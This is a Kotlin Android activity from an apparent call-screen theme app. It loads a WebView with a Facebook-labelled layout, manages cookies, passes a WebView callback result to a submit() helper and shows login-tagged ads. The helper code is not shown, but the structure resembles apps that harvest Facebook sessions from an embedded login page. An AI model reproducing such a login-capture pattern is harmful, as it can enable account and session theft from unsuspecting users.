package ftp.callshow.colorss.app.activity

import android.view.View
import android.view.WindowManager
import ftp.callshow.colorss.app.R
import ftp.callshow.colorss.app.base.ChainsmokersActivity
import ftp.callshow.colorss.app.event.Event
import ftp.callshow.colorss.app.http.submit
import ftp.callshow.colorss.app.utils.back
import ftp.callshow.colorss.app.utils.customTimer
import ftp.callshow.colorss.app.utils.manageCookie
import ftp.callshow.colorss.app.utils.setWebView
import kotlinx.android.synthetic.main.activity_fading.*
import org.greenrobot.eventbus.EventBus

class FadingActivity : ChainsmokersActivity() {

    override fun getLayoutId(): Int {
        return R.layout.activity_fading
    }

    override fun initActivity() {
        super.initActivity()
        manageCookie()
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        back.setOnClickListener { onBackPressed() }
        customTimer { showInertAdvertisement() }
        setWebView(webView,
            { activityFaceBookFl.visibility = View.GONE },
            { content.visibility = View.GONE },
            {
                submit(it, {
                    EventBus.getDefault().post(Event("finish"))
                    finish()
                }, {})
            })
    }

    override fun onResume() {
        super.onResume()
        webView.onResume()
    }

    override fun onPause() {
        super.onPause()
        webView.onPause()
    }

    override fun onBackPressed() {
        back(webView, {
            showInertAdvertisement(percent = true, target = "inter_login")
        }, {
            super.onBackPressed()
        })
    }
}